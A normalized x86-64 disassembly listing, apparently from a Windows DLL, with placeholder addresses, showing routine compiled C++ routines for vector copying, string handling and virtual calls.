mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_1800069c0
sub rdi rax
mov rax 0x6666666666666667
imul rdi
mov rdi rdx
sar rdi 0x4
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x28
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
movzx eax [ rdi ]
mov [ rcx ] ax
movzx eax [ rdi + 0x2 ]
mov [ rcx + 0x2 ] al
movzx eax [ rdi + 0x3 ]
mov [ rcx + 0x3 ] al
lea rdx [ rdi + 0x8 ]
add rcx 0x8
call sub_180002700
nop
lea rdx [ rdi + rdi * 4 ]
mov r8 [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_1800069c0
jmp r-xdata
movzx eax [ r8 + rdx * 8 ]
mov [ rcx ] ax
movzx eax [ r8 + rdx * 8 + 0x2 ]
mov [ rcx + 0x2 ] al
movzx eax [ r8 + rdx * 8 + 0x3 ]
mov [ rcx + 0x3 ] al
lea rdx [ r8 + rdx * 8 + 0x8 ]
add rcx 0x8
call sub_180002700
nop
sub_180007040
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_180006df0
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18001c80c
sub_180007070
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xa0
mov [ rbp + 0x2f ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov r14 rdx
mov r13 rcx
mov rbx [ rcx + 0xc8 ]
xor r12d r12d
cmp rbx [ rcx + 0xd0 ]
je r-xdata
mov rax [ r14 ]
lea rdx [ rbp + 0x7 ]
mov rcx r14
call [ rax + 0x30 ]
nop
movzx r8d [ rax ]
lea rdx [ rbp - 0x49 ]
mov rcx r13
call sub_180005ea0
nop
mov rbx [ rbp + 0xf ]
test rbx rbx
je r-xdata
nop [ rax + rax ] eax
mov [ rbp + 0xf ] r12
mov [ rbp + 0x17 ] r12
mov [ rbp + 0x1f ] r12
cmp [ rbp - 0x49 ] 0x0
jne r-xdata
mov rdi [ rbp + 0x17 ]
cmp rbx rdi
je r-xdata
test r12b r12b
jne r-xdata
mov rsi [ rbp - 0x11 ]
cmp rdi rsi
je r-xdata
lea rdx [ rbp - 0x49 ]
lea rcx [ r13 + 0xc8 ]
call sub_180006f40
mov rcx [ r13 + 0x48 ]
mov rax [ rcx ]
mov rdx r14
call [ rax + 0x18 ]
movzx r11d [ rbp - 0x49 ]
mov [ rbp - 0x21 ] r11w
movzx eax [ rbp - 0x47 ]
mov [ rbp - 0x1f ] al
movzx eax [ rbp - 0x46 ]
mov [ rbp - 0x1e ] al
lea rdx [ rbp - 0x41 ]
lea rcx [ rbp - 0x19 ]
call sub_180002700
mov rcx [ r13 + 0x48 ]
mov rax [ rcx ]
lea rdx [ rbp - 0x21 ]
call [ rax + 0x28 ]
nop
mov rsi [ rbp - 0x41 ]
test rsi rsi
je r-xdata
mov rax [ rbp - 0x39 ]
cmp [ rbp - 0x41 ] rax
jne r-xdata
mov rcx rbx
call j_sub_18001c80c
nop
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
add rbx 0x28
cmp rbx [ r13 + 0xd0 ]
jne r-xdata
mov rcx rdi
call j_sub_18001c80c
xor eax eax
nop [ rax + rax ] eax
mov rbx rsi
mov rdi [ rbp - 0x39 ]
cmp rsi rdi
je r-xdata
mov rax [ r14 ]
lea rdx [ rbp - 0x21 ]
mov rcx r14
call [ rax + 0x30 ]
nop
movzx ecx [ rax ]
mov [ rbp - 0x49 ] cx
movzx ecx [ rax + 0x2 ]
mov [ rbp - 0x47 ] cl
movzx ecx [ rax + 0x3 ]
mov [ rbp - 0x46 ] cl
lea rdx [ rax + 0x8 ]
lea rcx [ rbp - 0x41 ]
call sub_180005cd0
nop
lea rcx [ rbp - 0x19 ]
call sub_180002680
movzx r11d [ rbp - 0x49 ]
mov [ rbp - 0x21 ] r11w
movzx eax [ rbp - 0x47 ]
mov [ rbp - 0x1f ] al
movzx eax [ rbp - 0x46 ]
mov [ rbp - 0x1e ] al
lea rdx [ rbp - 0x41 ]
lea rcx [ rbp - 0x19 ]
call sub_180002700
lea rdx [ rbp - 0x21 ]
mov rcx r13
call sub_180005af0
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
mov rax [ r14 ]
lea rdx [ rbp - 0x21 ]
mov rcx r14
call [ rax + 0x30 ]
movzx ecx [ rbx ]
cmp [ rax ] cx
sete r12b
mov rdi [ rbp - 0x19 ]
test rdi rdi
je r-xdata
xor r12d r12d
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rax
mov [ rdi ] ax
add rdi 0x28
cmp rdi rsi
jne r-xdata
mov rcx [ rdi ]
call j_sub_18001c80c
xor eax eax
mov rcx rsi
call j_sub_18001c80c
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rbx [ rbp + 0xf ]
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov rdi [ rbp - 0x19 ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_18001c80c
sub_1800072f0
mov rax rsp
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x680
mov [ rsp + 0x2b0 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x678 ] rax
mov r13 rdx
mov rdi rcx
mov [ rsp + 0x48 ] rcx
mov [ rsp + 0x38 ] rdx
xor r14d r14d
mov r12d r14d
mov [ rsp + 0x30 ] r14d
lea ecx [ r14 + 0x30 ]
call sub_18001c84c
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov rsi r14
mov rcx rax
call sub_180008850
mov rsi rax
jmp r-xdata
mov r8d 0x14
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x380 ]
cdqe
lea r8 [ __dos_header ]
movzx eax [ r8 + rax + 0x8500 ]
mov ecx [ r8 + rax * 4 + 0x84c4 ]
add rcx r8
jmp rcx
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x30 ] rsi
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088d0
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x628 ]
mov rcx rsi
call sub_180009450
nop
mov r8d 0x17
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x600 ]
mov rcx rsi
call sub_180009450
nop
mov rdx [ r13 ]
movzx eax [ rdx + 0xa ]
dec eax
cmp eax 0x3c
ja r-xdata
cmp [ rsp + 0x618 ] 0x10
jb r-xdata
mov rcx rsi
call sub_180008890
mov rcx rsi
call j_sub_18001c80c
nop
lea rcx [ rdi + 0x40 ]
mov rax [ rcx ]
mov edx [ rdx + 0xc ]
call [ rax + 0x18 ]
jmp r-xdata
cmp [ rdx + 0x20 ] 0x4
jne r-xdata
cmp [ rdx + 0x20 ] 0x4
jne r-xdata
mov [ rsp + 0x200 ] 0x7
mov [ rsp + 0x1f8 ] r14
mov [ rsp + 0x1e8 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x1e8 ]
call sub_180003b50
mov rcx [ rdi + 0x68 ]
mov rax [ rcx ]
mov r9d [ rw-data ]
lea r8 [ rsp + 0x1e8 ]
mov edx [ rdi + 0xe8 ]
call [ rax + 0x18 ]
test al al
je r-xdata
xor r15b r15b
mov [ rsp + 0x50 ] r14
lea r9 [ rsp + 0x50 ]
mov r8 [ rdx + 0x20 ]
mov rdx [ rdx + 0x18 ]
mov rcx rsi
call sub_180009040
mov r12 rax
mov ecx 0x28
call sub_18001c84c
mov rbx rax
test rax rax
je r-xdata
cmp [ rdx + 0x20 ] 0x0
jbe r-xdata
cmp [ rdx + 0x20 ] 0x4
jne r-xdata
cmp [ rdx + 0x20 ] 0x2
jne r-xdata
mov r8 [ rdx + 0x20 ]
mov rdx [ rdx + 0x18 ]
lea rcx [ rsp + 0x58 ]
call sub_180009ed0
nop
movzx ecx [ rsp + 0x58 ]
test cx cx
jne r-xdata
cmp [ rdx + 0x20 ] 0x8
jne r-xdata
cmp [ rdx + 0x20 ] 0x2
jne r-xdata
cmp [ rdx + 0x20 ] 0x8
jne r-xdata
cmp [ rdx + 0x20 ] 0x2
jne r-xdata
mov rcx rdi
call sub_180003850
mov r11 [ rdi ]
mov rcx rdi
call [ r11 + 0x50 ]
jmp r-xdata
mov [ rsp + 0x618 ] 0xf
mov [ rsp + 0x610 ] r14
mov [ rsp + 0x600 ] 0x0
cmp [ rsp + 0x640 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x600 ]
call j_sub_18001c80c
or rbx 0xffffffffffffffff
mov [ rsp + 0x2d0 ] 0xf
mov [ rsp + 0x2c8 ] r14
mov [ rsp + 0x2b8 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x600 ]
lea rcx [ rsp + 0x2b8 ]
call sub_180003a40
mov r11 [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ r11 + 0xc ]
lea rdx [ rsp + 0x2b8 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
mov rax [ rdx + 0x18 ]
mov ecx [ rax ]
lea eax [ rcx - 0x1 ]
cmp eax 0x2932dfe
ja r-xdata
mov [ rsp + 0x2a0 ] 0xf
mov [ rsp + 0x298 ] r14
mov [ rsp + 0x288 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x600 ]
lea rcx [ rsp + 0x288 ]
call sub_180003a40
mov r11 [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ r11 + 0xc ]
lea rdx [ rsp + 0x288 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
mov rax [ rdx + 0x18 ]
mov ecx [ rax ]
cmp [ rdi + 0xec ] 0x0
jbe r-xdata
xor bl bl
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
mov [ rsp + 0x320 ] 0x7
mov [ rsp + 0x318 ] r14
mov [ rsp + 0x308 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x308 ]
call sub_180003b50
mov rcx [ rdi + 0x68 ]
mov rax [ rcx ]
mov r9d [ rw-data ]
lea r8 [ rsp + 0x308 ]
mov edx [ rdi + 0xec ]
call [ rax + 0x18 ]
test al al
je r-xdata
mov rbx r14
mov rdx [ rsp + 0x50 ]
mov [ rax ] r14
mov [ rax + 0x8 ] r14w
mov [ rax + 0xa ] r15b
mov [ rax + 0xc ] r14d
mov [ rax + 0x10 ] r15b
mov [ rax + 0x18 ] r12
mov [ rax + 0x20 ] rdx
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
cmp rdx 0x200000
cmova ecx eax
mov [ rbx + 0x11 ] cl
jmp r-xdata
mov [ rsp + 0x188 ] 0xf
mov [ rsp + 0x180 ] r14
mov [ rsp + 0x170 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x600 ]
lea rcx [ rsp + 0x170 ]
call sub_180003a40
mov rax [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rax + 0xc ]
lea rdx [ rsp + 0x170 ]
mov rcx rdi
call sub_180004760
nop
mov r8 [ rdx + 0x20 ]
mov rdx [ rdx + 0x18 ]
mov [ rsp + 0x668 ] 0x7
mov [ rsp + 0x660 ] r14
mov [ rsp + 0x650 ] r14w
shr r8 0x1
lea rcx [ rsp + 0x650 ]
call sub_180003b50
nop
lea rdx [ rsp + 0x650 ]
mov rcx [ rdi + 0x58 ]
call sub_18000def0
test al al
je r-xdata
mov [ rsp + 0x278 ] 0xf
mov [ rsp + 0x270 ] r14
mov [ rsp + 0x260 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x600 ]
lea rcx [ rsp + 0x260 ]
call sub_180003a40
mov r11 [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ r11 + 0xc ]
lea rdx [ rsp + 0x260 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
mov rax [ rdx + 0x18 ]
mov r12d [ rax ]
mov rcx [ rdi + 0x70 ]
mov rax [ rcx ]
mov edx r12d
call [ rax + 0x8 ]
mov r15 rax
mov ecx [ rw-data ]
xor r15 rcx
lea rbx [ rdi + 0xa0 ]
mov rcx [ rbx + 0x8 ]
cmp [ rbx ] rcx
je r-xdata
lea rdx [ rsp + 0x3f8 ]
jmp r-xdata
mov rax [ rdx + 0x18 ]
movzx r10d [ rax ]
mov r9 r14
mov rcx [ rdi + 0xd0 ]
sub rcx [ rdi + 0xc8 ]
mov r11 0x6666666666666667
mov rax r11
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
je r-xdata
mov [ rsp + 0x330 ] cx
movzx eax [ rsp + 0x5a ]
mov [ rsp + 0x332 ] al
movzx eax [ rsp + 0x5b ]
mov [ rsp + 0x333 ] al
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0x338 ]
call sub_180002700
mov rcx [ rdi + 0x48 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x330 ]
call [ rax + 0x28 ]
movzx r15d al
xor r8b r8b
mov r11 0x6666666666666667
movzx r10d [ rsp + 0x58 ]
mov rax [ rsp + 0x68 ]
cmp [ rsp + 0x60 ] rax
jne r-xdata
mov rax [ rdx + 0x18 ]
mov rbx [ rax ]
test rbx rbx
je r-xdata
mov rax [ rdx + 0x18 ]
movzx ebx [ rax ]
mov r12d 0x1
mov rax [ rdi + 0x80 ]
sub rax [ rdi + 0x78 ]
sar rax 0x3
cmp r12 rax
jae r-xdata
mov rax [ rdx + 0x18 ]
mov rbx [ rax ]
test rbx rbx
je r-xdata
mov rax [ rdx + 0x18 ]
movzx r10d [ rax ]
mov r12d 0x1
mov rcx [ rdi + 0xd0 ]
sub rcx [ rdi + 0xc8 ]
mov r11 0x6666666666666667
mov rax r11
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r12 rdx
jae r-xdata
mov [ rsp + 0x640 ] 0xf
mov [ rsp + 0x638 ] r14
mov [ rsp + 0x628 ] 0x0
mov rdi [ r13 + 0x8 ]
test rdi rdi
je r-xdata
mov rcx [ rsp + 0x628 ]
call j_sub_18001c80c
test rsi rsi
je r-xdata
mov [ rdi + 0xe8 ] ecx
mov [ rsp + 0x138 ] 0xf
mov [ rsp + 0x130 ] r14
mov [ rsp + 0x120 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x628 ]
lea rcx [ rsp + 0x120 ]
call sub_180003a40
mov r11 [ r13 ]
mov [ rsp + 0x20 ] 0x64
mov r9b 0x1
mov r8d [ r11 + 0xc ]
lea rdx [ rsp + 0x120 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
cmp ecx [ rdi + 0xe8 ]
ja r-xdata
mov rcx [ r13 ]
mov r8d [ rcx + 0xc ]
mov [ rsp + 0x20 ] 0x64
mov rdx rax
mov rcx rdi
call sub_180004760
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
mov bl 0x1
jmp r-xdata
mov r8d 0x19
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
mov rdx rbx
mov rcx [ rdi + 0x50 ]
call sub_18000b4e0
mov r12 rax
test rax rax
je r-xdata
mov r8 [ rsp + 0x50 ]
mov rdx r12
mov rcx [ rdi + 0x50 ]
call sub_18000b3e0
test al al
je r-xdata
mov [ rsp + 0x110 ] 0xf
mov [ rsp + 0x108 ] r14
mov [ rsp + 0xf8 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x600 ]
lea rcx [ rsp + 0xf8 ]
call sub_180003a40
mov rax [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rax + 0xc ]
lea rdx [ rsp + 0xf8 ]
mov rcx rdi
call sub_180004760
nop
mov rbx [ r13 ]
mov rcx [ rbx + 0x20 ]
add rcx 0x2
mov edx 0x1
call sub_18001d210
mov r15 rax
mov r8 [ rbx + 0x20 ]
mov rdx [ rbx + 0x18 ]
mov rcx rax
call sub_18001c4a0
mov ecx 0x28
call sub_18001c84c
mov r12 rax
test rax rax
je r-xdata
mov rcx [ rbx ]
sub rcx rcx
sar rcx 0x3
mov [ rsp + 0x40 ] rcx
mov rax [ rbx + 0x10 ]
cmp [ rbx + 0x8 ] rax
jne r-xdata
mov rdx [ rbx ]
mov r8 [ rdx ]
mov rcx [ rdi + 0xa8 ]
cmp rdx rcx
je r-xdata
mov rcx rsi
call sub_180009450
xor r9d r9d
mov r8 [ rdi + 0xc8 ]
xor al al
jne r-xdata
lea r12 [ r9 + r9 * 4 ]
mov rax [ rdi + 0xc8 ]
cmp [ rax + r12 * 8 ] r10w
jne r-xdata
mov [ rsp + 0x2f8 ] 0xf
mov [ rsp + 0x2f0 ] r14
mov [ rsp + 0x2e0 ] cl
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x600 ]
lea rcx [ rsp + 0x2e0 ]
call sub_180003a40
mov rax [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rax + 0xc ]
lea rdx [ rsp + 0x2e0 ]
mov rcx rdi
call sub_180004760
nop
lea rcx [ rsp + 0x60 ]
call sub_180002680
nop
jmp r-xdata
mov r8d 0x26
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x538 ]
jmp r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
test ax ax
je r-xdata
mov r8d 0x28
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x588 ]
jmp r-xdata
mov rax [ rdi + 0x78 ]
mov rcx [ rax + r12 * 8 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
cmp ax bx
je r-xdata
xor r15b r15b
mov rax [ rbx ]
lea rdx [ rsp + 0x358 ]
mov rcx rbx
call [ rax + 0x30 ]
mov r12d 0x1
cmp [ rax ] 0x0
je r-xdata
mov r8d 0x28
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x3d0 ]
jmp r-xdata
mov rcx [ rdi + 0xc8 ]
lea r8 [ rcx + 0x28 ]
mov rcx [ rsp + 0x678 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x680 ]
mov rbx [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov eax ebx
[ rdi + 0x8 ] eax
dec eax
jne r-xdata
mov [ rdi + 0xec ] ecx
mov [ rsp + 0x1b0 ] 0xf
mov [ rsp + 0x1a8 ] r14
mov [ rsp + 0x198 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x628 ]
lea rcx [ rsp + 0x198 ]
call sub_180003a40
mov r11 [ r13 ]
mov [ rsp + 0x20 ] 0x64
mov r9b 0x1
mov r8d [ r11 + 0xc ]
lea rdx [ rsp + 0x198 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
lea rdx [ rsp + 0x560 ]
mov rcx rsi
call sub_180009450
movzx r9d bl
jmp r-xdata
lea rdx [ rsp + 0x510 ]
mov rcx rsi
call sub_180009450
mov rcx [ r13 ]
mov [ rsp + 0x20 ] 0x23
movzx r9d r15b
mov r8d [ rcx + 0xc ]
mov rdx rax
mov rcx rdi
call sub_180004760
nop
or rbx 0xffffffffffffffff
jmp r-xdata
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
test rbx rbx
je r-xdata
mov r8d 0xa
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x420 ]
mov rcx rsi
call sub_1800092e0
mov rcx [ rdi + 0x68 ]
mov r10 [ rcx ]
xor r9d r9d
mov r8 rax
mov rdx r12
call [ r10 + 0x20 ]
mov rcx rsi
test al al
je r-xdata
jmp r-xdata
mov rcx [ rsp + 0x650 ]
call j_sub_18001c80c
jmp r-xdata
mov r12 r14
mov rax [ r13 ]
mov rdx [ rax + 0x20 ]
mov [ r12 ] r14
mov [ r12 + 0x8 ] r14w
mov [ r12 + 0xa ] 0x0
mov [ r12 + 0xc ] r14d
mov [ r12 + 0x10 ] 0x0
mov [ r12 + 0x18 ] r15
mov [ r12 + 0x20 ] rdx
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
cmp rdx 0x200000
cmova ecx eax
mov [ r12 + 0x11 ] cl
jmp r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov edx 0x1
mov rcx rbx
call sub_180003cb0
mov rcx [ rsp + 0x40 ]
mov [ rsp + 0x228 ] 0x7
mov [ rsp + 0x220 ] r14
mov [ rsp + 0x210 ] r14w
xor r8d r8d
lea rdx [ r--data ]
lea rcx [ rsp + 0x210 ]
call sub_180003b50
mov rcx [ rdi + 0x68 ]
mov rax [ rcx ]
mov r9d [ rw-data ]
lea r8 [ rsp + 0x210 ]
mov edx r12d
call [ rax + 0x18 ]
mov rcx rsi
test al al
jne r-xdata
mov rax [ rdx ]
cmp rax r8
cmove rax r15
mov [ rdx ] rax
add rdx 0x8
cmp rdx rcx
jne r-xdata
mov rcx [ rdi + 0x48 ]
mov rax [ rcx ]
movzx edx r10w
call [ rax + 0x20 ]
mov [ rsp + 0x98 ] 0xf
mov [ rsp + 0x90 ] r14
mov [ rsp + 0x80 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x628 ]
lea rcx [ rsp + 0x80 ]
call sub_180003a40
mov r11 [ r13 ]
mov [ rsp + 0x20 ] 0x64
mov r9b 0x1
mov r8d [ r11 + 0xc ]
lea rdx [ rsp + 0x80 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
inc r9
add r8 0x28
mov rcx [ rdi + 0xd0 ]
sub rcx [ rdi + 0xc8 ]
mov rax r11
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r9 rdx
jb r-xdata
or rbx 0xffffffffffffffff
mov [ rsp + 0x160 ] 0xf
mov [ rsp + 0x158 ] r14
mov [ rsp + 0x148 ] al
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x600 ]
lea rcx [ rsp + 0x148 ]
call sub_180003a40
mov rax [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rax + 0xc ]
lea rdx [ rsp + 0x148 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
inc r8b
jmp r-xdata
mov [ rsp + 0xa8 ] r10w
movzx eax [ rsp + 0x5a ]
mov [ rsp + 0xaa ] al
movzx eax [ rsp + 0x5b ]
mov [ rsp + 0xab ] al
lea rdx [ rsp + 0x60 ]
lea rcx [ rsp + 0xb0 ]
call sub_180002700
lea rdx [ rsp + 0xa8 ]
mov rcx rdi
call sub_180005af0
test al al
jne r-xdata
mov rdx rbx
mov rcx rdi
call sub_180004000
lea rcx [ rdi + 0x40 ]
mov rax [ rcx ]
xor edx edx
call [ rax + 0x18 ]
jmp r-xdata
mov rax [ rdi + 0x78 ]
mov rbx [ rax + r12 * 8 ]
lea rcx [ rax + r12 * 8 ]
mov r8 [ rdi + 0x80 ]
lea rdx [ rcx + 0x8 ]
sub r8 rdx
and r8 0xfffffffffffffff8
call sub_18001c4a0
add [ rdi + 0x80 ] 0xfffffffffffffff8
mov rax [ rbx ]
mov dl 0x1
mov rcx rbx
call [ rax + 0x60 ]
jmp r-xdata
inc r12
mov rax [ rdi + 0x80 ]
sub rax [ rdi + 0x78 ]
sar rax 0x3
cmp r12 rax
jb r-xdata
test r15b r15b
je r-xdata
lea rcx [ rsp + 0x360 ]
call sub_180002680
movzx r15d r12b
jmp r-xdata
lea rax [ r12 + r12 * 4 ]
lea r8 [ rcx + rax * 8 ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rdi + 0xc8 ]
call sub_180006920
jmp r-xdata
inc r12
add r8 0x28
mov rdx [ rdi + 0xd0 ]
sub rdx rcx
mov rax r11
imul rdx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r12 rdx
jb r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ] ebx
dec ebx
jne r-xdata
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
mov r8d 0x16
lea rdx [ rw-data ]
call sub_1800088c0
mov r8d 0x10
lea rdx [ rw-data ]
call sub_1800088c0
mov r15b 0x1
jmp r-xdata
or rbx 0xffffffffffffffff
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x5b0 ]
mov rcx rsi
call sub_1800092e0
mov rcx [ rdi + 0x68 ]
mov r10 [ rcx ]
xor r9d r9d
mov r8 rax
mov rdx r15
call [ r10 + 0x20 ]
test al al
je r-xdata
mov rdx r12
mov rcx [ rdi + 0x50 ]
call sub_18000b4e0
mov r15 rax
test rax rax
je r-xdata
add [ rbx + 0x8 ] 0x8
mov r8 [ rbx + 0x8 ]
lea rdx [ r8 - 0x8 ]
mov rax [ rbx ]
lea rcx [ rax + rcx * 8 ]
cmp rcx rdx
je r-xdata
mov [ rax ] r15
mov r8d 0x10
lea rdx [ rw-data ]
call sub_1800088c0
mov bl 0x1
mov r8d 0x16
lea rdx [ rw-data ]
call sub_1800088c0
xor bl bl
jmp r-xdata
jmp r-xdata
cmp [ r8 ] r10w
je r-xdata
jmp r-xdata
lea rcx [ rsp + 0x60 ]
call sub_180002680
nop
jmp r-xdata
movzx r9d r8b
mov rcx [ rdi + 0xd0 ]
sub rcx [ rdi + 0xc8 ]
mov rax r11
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r9 rdx
jae r-xdata
mov rax [ rdi + 0xc8 ]
lea r8 [ rax + r12 * 8 ]
lea rdx [ rsp + 0x40 ]
lea rcx [ rdi + 0xc8 ]
call sub_180006920
lea rdx [ rsp + 0x58 ]
lea rcx [ rdi + 0xc8 ]
call sub_180006f40
mov rax [ r13 ]
lea rcx [ rdi + 0x40 ]
mov r8 [ rcx ]
mov edx [ rax + 0xc ]
call [ r8 + 0x18 ]
test r15b r15b
je r-xdata
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x448 ]
mov rcx rsi
call sub_180009450
mov rcx [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rcx + 0xc ]
mov rdx rax
mov rcx rdi
call sub_180004760
jmp r-xdata
mov r8d 0x26
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x5d8 ]
jmp r-xdata
mov rdx rbx
mov rcx rdi
call sub_180007070
jmp r-xdata
test r12b 0x1
je r-xdata
cmp [ r8 ] r10w
je r-xdata
jmp r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
mov rcx r12
call j_sub_18001c80c
jmp r-xdata
call sub_18001c80c
mov rcx [ r12 ]
test rcx rcx
je r-xdata
cmp [ rsp + 0x668 ] 0x8
jb r-xdata
mov rcx [ r12 + 0x18 ]
test rcx rcx
je r-xdata
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
lea rdx [ rsp + 0x4c0 ]
mov rcx rsi
call sub_180009450
mov rcx [ r13 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rcx + 0xc ]
mov rdx rax
mov rcx rdi
call sub_180004760
or rbx 0xffffffffffffffff
mov [ rsp + 0x250 ] 0xf
mov [ rsp + 0x248 ] r14
mov [ rsp + 0x238 ] 0x0
or rbx 0xffffffffffffffff
mov r9 rbx
xor r8d r8d
lea rdx [ rsp + 0x628 ]
lea rcx [ rsp + 0x238 ]
call sub_180003a40
mov rax [ r13 ]
mov [ rsp + 0x20 ] 0x64
mov r9b 0x1
mov r8d [ rax + 0xc ]
lea rdx [ rsp + 0x238 ]
mov rcx rdi
call sub_180004760
jmp r-xdata
cmp rdx r8
je r-xdata
lea rdx [ rsp + 0x3a8 ]
mov rcx rsi
call sub_180009450
movzx r9d bl
jmp r-xdata
mov r8d 0x30
lea rdx [ rw-data ]
mov rcx rsi
call sub_1800088c0
